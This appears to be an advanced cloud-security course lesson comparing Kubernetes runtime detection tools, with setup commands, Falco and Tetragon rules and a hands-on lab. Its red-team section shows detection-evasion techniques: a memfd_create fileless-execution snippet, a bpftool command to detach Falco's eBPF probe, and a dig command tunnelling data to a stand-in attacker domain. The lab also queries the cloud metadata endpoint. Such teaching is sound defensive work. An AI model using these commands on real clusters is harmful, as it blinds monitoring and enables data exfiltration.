# 12 — Runtime Security Tools Comparison

> **Level:** Advanced
> **Prereqs:** [Container Escape Classes](container-escape-classes.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Execution, Privilege Escalation, Defense Evasion, Discovery (see ATT&CK Containers matrix)
> **Authorization scope:** Run only in your own sandbox clusters. All tool comparisons use free/open-source tiers or trial licenses. No bypass techniques tested against production security tooling.

## What & why

Runtime security tools detect and respond to malicious activity inside running containers and Kubernetes clusters — fileless malware, cryptominers, container escapes, privilege escalations, and anomalous network connections. Choosing the wrong tool (or none) means an attacker can dwell inside a pod for months with zero detection. This lesson compares the five major open-source tools and their cloud-managed equivalents.

## The OnPrem reality

On-prem runtime detection relied on host-based agents (AV, EDR) that understood processes and files. Containers broke this model: an agent on the host VM cannot see inside the container's namespace without kernel instrumentation (eBPF / kernel module). On-prem shops running Kubernetes often deployed Falco as their first container-aware runtime detector.

## Core concepts

### Detection architectures

| Architecture | How it works | Overhead | Examples |
|---|---|---|---|
| eBPF probe | Kernel-level events (syscalls, network, file) via eBPF programs | Low (2–5% CPU) | Falco, Tracee, Tetragon |
| Kernel module | Loads a kernel driver to intercept syscalls | Medium (5–10%) | Falco (legacy driver) |
| Audit log analysis | Watches kube-apiserver audit logs, not runtime | Near-zero | Kubernetes audit |
| Sidecar container | Runs as a sidecar in each pod, watches pod-level activity | Medium-high | Aqua (micro-enforcer mode) |
| DaemonSet agent | One agent per node, watches all pods on that node | Low-medium | Most tools |

### Comparison matrix

| Tool | Detection engine | Performance overhead | Alert rules language | Open source | Cloud managed equivalent |
|---|---|---|---|---|---|
| Falco | eBPF + kernel module | Low (2–5%) | Falco rules (YAML) | CNCF graduated | AWS GuardDuty EKS, GKE Security Posture |
| Tetragon | eBPF only | Very low (1–3%) | TracingPolicy (CRD) | Yes (Isovalent/Cilium) | — |
| Tracee | eBPF only | Low (2–4%) | Go signatures + rego | Yes (Aqua) | — |
| Sysdig | Kernel module + eBPF | Low-medium (3–8%) | Falco rules + Sysdig policies | Partially (agent open, backend SaaS) | Sysdig Secure SaaS |
| Aqua | Multiple (eBPF, sidecar, audit) | Medium (5–15%) | Aqua policies (YAML) | No (commercial) | Aqua SaaS / self-hosted |
| Datadog CSM | eBPF | Low (2–5%) | Datadog detection rules | No (SaaS) | Datadog Cloud Security Mgmt |
| Prisma Cloud (Twistlock) | eBPF + audit + network | Medium (5–10%) | Prisma policies | No (commercial) | Prisma Cloud SaaS |

## AWS

### GuardDuty EKS Protection

Amazon GuardDuty EKS Protection (as of June 2026) monitors Kubernetes audit logs and detects suspicious behavior without deploying agents:

```bash
# Enable GuardDuty EKS Protection
aws guardduty create-detector --enable --finding-publishing-frequency ONE_HOUR

aws guardduty update-detector \
  --detector-id 12abc34d567e8f9012345d6789abcde0 \
  --features '[{"Name": "EKS_AUDIT_LOGS", "Status": "ENABLED"}, {"Name": "EKS_RUNTIME_MONITORING", "Status": "ENABLED"}]'
```

**What GuardDuty EKS detects (managed, no agent):**
- `Execution:Kubernetes/ExecInKubeSystemPod` — exec into critical pods
- `PrivilegeEscalation:Kubernetes/PrivilegedContainer` — privileged container launch
- `Persistence:Kubernetes/ContainerWithSensitiveMount` — host volume mounts
- `Discovery:Kubernetes/MaliciousIPCaller` — calls to known C2 IPs from pods

```bash
# Deploy Falco as a DaemonSet (complementary to GuardDuty)
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --set falco.driver.kind=ebpf \
  --set falco.jsonOutput=true
```

**Gotcha:** GuardDuty EKS has ~5-minute detection latency (audit log polling). Falco on eBPF detects in milliseconds. Use both: GuardDuty for managed coverage, Falco for real-time response.

## Azure

### Defender for Containers

Azure Defender for Containers bundles runtime detection with agentless assessment:

```bash
# Enable Defender for Containers
az security pricing create --name Containers --tier Standard

# View Defender alerts for AKS
az security alert list \
  --resource-group aks-rg \
  --query "[?properties.alertDisplayName.contains('Container')]"
```

**Defender for Containers detects:**
- Crypto-mining activity in pods
- Privileged container creation
- Sensitive volume mounts (host Docker socket)
- Outbound connections to known malicious IPs
- Suspicious file downloads (`curl/wget` inside container then execution)

**Falco on AKS:**
```bash
# Note: AKS uses containerd, not Docker. Falco eBPF probe works.
helm install falco falcosecurity/falco \
  --set driver.kind=ebpf \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true
```

## GCP

### GKE Security Posture + Falco

GKE Security Posture (as of June 2026) provides managed vulnerability scanning and workload compliance checks. For runtime detection, deploy Falco or Tetragon:

```bash
# Enable GKE Security Posture
gcloud container clusters update cluster-1 \
  --zone us-central1-a \
  --security-posture=standard

# Tetragon via Cilium (GKE Dataplane V2 supports Cilium)
helm install tetragon cilium/tetragon \
  --namespace kube-system

# Tetragon TracingPolicy example — detect namespace escape
kubectl apply -f - <<EOF
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-ns-escape
spec:
  kprobes:
  - call: "switch_task_namespaces"
    syscall: false
    args:
    - index: 0
      type: nsp
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotEqual"
        values:
        - ""
EOF
```

**GCP-specific detection — metadata server access from pod:**
```bash
# Falco rule: detect pod hitting GCP metadata server
- rule: GCP Metadata Server Access
  desc: Detect when a container accesses the GCP metadata server
  condition: >
    evt.type = connect and
    evt.dir = < and
    fd.sip = "169.254.169.254" and
    container
  output: "GCP metadata access from container (user=%user.name command=%proc.cmdline)"
  priority: WARNING
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Native runtime detection | Falco / Tetragon / Sysdig | GuardDuty EKS + Inspector | Defender for Containers | GKE Security Posture (limited) + Falco |
| eBPF support | Kernel ≥ 4.14 | EKS optimized AMI (≥ 5.10) | AKS Ubuntu / Mariner | GKE COS / Ubuntu (≥ 5.10) |
| Alert pipeline | Falcosidekick → Slack/PagerDuty | GuardDuty → EventBridge → SNS | Defender → Sentinel / Logic Apps | SCC → Pub/Sub → Cloud Function |
| Agentless option | N/A | GuardDuty (audit logs only) | Defender agentless scanning | SCC (compliance only, not runtime) |
| FIM (file integrity) | Falco (inotify) | Inspector FIM for EC2 | Defender for Servers | — |
| Network anomaly | Tetragon (Cilium-aware) | GuardDuty + VPC Flow Logs | Defender + NSG Flow Logs | GKE network policy + flow logs |

## 🔴 Red Team view

Attackers adapt to runtime detection tooling. Understanding each tool's detection model enables precision evasion.

### Evading Falco (syscall-based detection)

Falco monitors anomalies by comparing syscall patterns against rules. Common evasion techniques:

1. **Syscall minimization:** Use memory-only payloads (fileless execution via `memfd_create`). Falco rules often trigger on `execve` or file writes — memory-only avoids both.

```bash
# Fileless execution — loads binary into memory without touching disk
# Uses memfd_create + fexecve (Linux)
python3 -c "
import os, ctypes
fd = os.memfd_create('payload', os.MFD_CLOEXEC)
os.write(fd, open('/dev/shm/malware_binary', 'rb').read())
os.fexecve(fd, ['payload'], {})
"
# No 'open/write' on disk → bypasses file-integrity Falco rules
```

2. **Rule exhaustion:** Generate thousands of benign events that match a broad Falco rule to flood the alert pipeline. The actual malicious event is buried in noise.

3. **eBPF hook evasion:** If the attacker has CAP_SYS_ADMIN, unload the Falco eBPF program:
```bash
# Requires CAP_SYS_ADMIN in the container
bpftool prog detach id <falco_prog_id> tracepoint
```

### Evading Tetragon (Cilium/TracingPolicy-based)

Tetragon uses in-kernel eBPF hooks on kprobes/tracepoints. Evasion requires avoiding the specific kernel functions being traced:

1. **Namespace escape via kernel exploits:** Tetragon hooks `switch_task_namespaces` to detect namespace changes. A kernel exploit that directly modifies `task_struct->nsproxy` without going through the standard function bypasses this hook.

2. **Side-channel processes:** Spawn helper processes that appear benign (e.g., `/usr/bin/sleep 99999`) while the parent process performs malicious activity. Tetragon associates process ancestry — but if the malicious action is in a short-lived child, the event window may be missed.

### Evading GuardDuty EKS (audit-log based)

GuardDuty relies on Kubernetes audit logs, not syscall monitoring:

1. **Avoid audited operations:** Attack from a workload that already has the needed rights — no RBAC escalation needed → no audit log anomaly.
2. **Rate limit the API server:** Flood audit logs with benign API calls to trigger GuardDuty's internal throttling.
3. **Operate below GuardDuty latency:** Complete the attack in under ~5 minutes — before the finding is generated — then erase evidence.

### Evading network-based detection

```bash
# DNS tunneling to bypass IP-based threat lists
# Encode data in DNS queries to attacker-controlled domain
dig $(echo "exfiltrated-data" | base64).attacker-controlled.example.com
# Most IP-based detection tools don't inspect DNS query payloads
```

**Artifacts left:** Even when attackers evade tool-specific detection, they leave artifacts: unusual DNS query patterns, process-tree anomalies, unexpected network connections. Correlation across multiple signals (logs + metrics + network) is the counter-evasion strategy.

## 🔵 Blue Team view

### Deployment patterns

**Tiered detection stack (recommended for production):**

```
Layer 1: Agentless (GuardDuty / Defender / SCC)
   ↓ Alert on: RBAC anomalies, known-malicious IPs, privileged pods
Layer 2: eBPF agent (Falco / Tetragon / Tracee)
   ↓ Alert on: syscall anomalies, file writes, cryptominers
Layer 3: Network detection (Tetragon / Cilium Hubble)
   ↓ Alert on: lateral connections, DNS anomalies, exfiltration
Layer 4: SIEM correlation (Sentinel / Chronicle / Elastic)
   ↓ Correlate alerts from Layers 1–3, apply UEBA
```

### Falco rule tuning — reduce false positives

```yaml
# Common false positive: package managers writing to /tmp
- macro: package_mgmt_binaries
  condition: proc.name in (dpkg, rpm, apt, apt-get, yum, dnf, apk, pip, npm)

- macro: package_mgmt_tmp
  condition: fd.name startswith /tmp/ and package_mgmt_binaries

# Tuned rule: exclude package manager activity from "write below /tmp" alerts
- rule: Write below tmp
  desc: Detect any write below /tmp not from package managers
  condition: >
    evt.type = openat and
    evt.dir = < and
    fd.name startswith /tmp/ and
    not package_mgmt_tmp and
    container
  output: "File write below /tmp (user=%user.name command=%proc.cmdline file=%fd.name)"
  priority: WARNING
```

### Alert pipeline integration

```bash
# Falcosidekick → Slack + EventBridge
helm upgrade falco falcosecurity/falco \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl="https://hooks.slack.com/services/..." \
  --set falcosidekick.config.aws.eventbridge.accesskeyid="AKIA..." \
  --set falcosidekick.config.aws.eventbridge.secretaccesskey="..." \
  --set falcosidekick.config.aws.eventbridge.region="us-east-1"
```

### Tuning guidance per tool

| Tool | Common FP source | Tuning approach |
|---|---|---|
| Falco | Package manager writes, CI/CD pipeline activity | Macro whitelisting, exclude known CI namespaces |
| Tetragon | Health probes, readiness probes | TracingPolicy selectors with namespace filters |
| Tracee | Go runtime syscalls (goroutine creation) | Signature whitelist for expected binaries |
| GuardDuty | Penetration test activity | Suppression rules with known pentest IP ranges |

## Hands-on lab

1. Install Falco on a local `kind` cluster:
```bash
kind create cluster --name runtime-lab
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --set falco.driver.kind=ebpf \
  --set falco.jsonOutput=true
```

2. Generate a test event — write to `/etc` inside a container:
```bash
kubectl run test-pod --image=alpine --restart=Never -- sleep 300
kubectl exec test-pod -- sh -c "echo 'test' > /etc/testfile"
```

3. Check Falco logs for the alert:
```bash
kubectl logs -n falco daemonset/falco | jq 'select(.output | contains("Write below etc"))'
```

4. Create a custom Falco rule to detect `curl` to metadata endpoints:
```yaml
- rule: Metadata Server Access
  desc: Detect container accessing cloud metadata endpoint
  condition: >
    evt.type = connect and
    (fd.sip = "169.254.169.254" or fd.sip = "metadata.google.internal") and
    container
  output: "Metadata access detected (cmd=%proc.cmdline ip=%fd.sip)"
  priority: CRITICAL
```

5. Test the rule:
```bash
kubectl exec test-pod -- wget -q -O- http://169.254.169.254/latest/meta-data/
```

**Teardown:**
```bash
kind delete cluster --name runtime-lab
```

## Detection rules & checklists

**Falco rule — cryptominer detection (CPU pattern + process):**
```yaml
- rule: Cryptominer detected
  desc: Detect known cryptominer processes or CPU mining patterns
  condition: >
    (proc.name in (xmrig, minergate, cpuminer) or
     (evt.type = connect and fd.sip in (mining_pool_ips))) and
    container
  output: "Crypto mining activity detected (cmd=%proc.cmdline)"
  priority: CRITICAL
  tags: [mining, mitre_t1648]
```

**Checklist:**
- [ ] Runtime detection deployed on every production Kubernetes node (Falco, Tetragon, or commercial).
- [ ] Cloud-managed detection enabled (GuardDuty EKS / Defender for Containers / GKE Security Posture).
- [ ] Alerts feed into a central SIEM / incident response pipeline (not just logs).
- [ ] False-positive tuning reviewed monthly: < 20% of alerts should be noise.
- [ ] eBPF used as the primary driver (not kernel module) on kernels ≥ 5.10.
- [ ] Alert on any container that accesses the cloud metadata endpoint.
- [ ] Run periodic red-team exercises to test detection coverage (simulated cryptominer, simulated escape).

## References
- [Falco Documentation](https://falco.org/docs/)
- [Tetragon (Cilium)](https://tetragon.cilium.io/)
- [Tracee (Aqua)](https://github.com/aquasecurity/tracee)
- [AWS GuardDuty EKS Protection](https://docs.aws.amazon.com/guardduty/latest/ug/kubernetes-protection.html)
- [Azure Defender for Containers](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-containers-introduction)
- [GKE Security Posture](https://cloud.google.com/kubernetes-engine/docs/concepts/security-posture)
- [MITRE ATT&CK Container Matrix](https://attack.mitre.org/matrices/enterprise/containers/)
- [Kubernetes Audit Logs](https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/)
